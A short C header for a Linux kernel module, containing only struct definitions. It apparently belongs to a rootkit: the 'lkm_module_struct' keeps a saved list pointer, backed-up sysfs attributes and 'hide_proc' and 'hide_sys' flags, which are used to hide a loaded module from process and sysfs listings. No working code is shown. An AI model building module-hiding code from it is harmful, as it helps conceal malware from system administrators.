#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

typedef struct mod_kobj {
	struct kobject *parent;
    	struct module_sect_attrs *sect_attrs;
	struct module_attribute  *bkp_modinfo_attrs;
	char name[30];
}mod_kobj_t;

struct lkm_module_struct {
	struct module *module;
	struct mod_kobj sys_obj;
	struct list_head *prev;
	bool hide_proc;
	bool hide_sys;
};

struct param_attribute {
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs {
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};

struct module_sect_attrs {
	struct attribute_group grp;
	unsigned int nsections;
	struct module_sect_attr attrs[0];
};


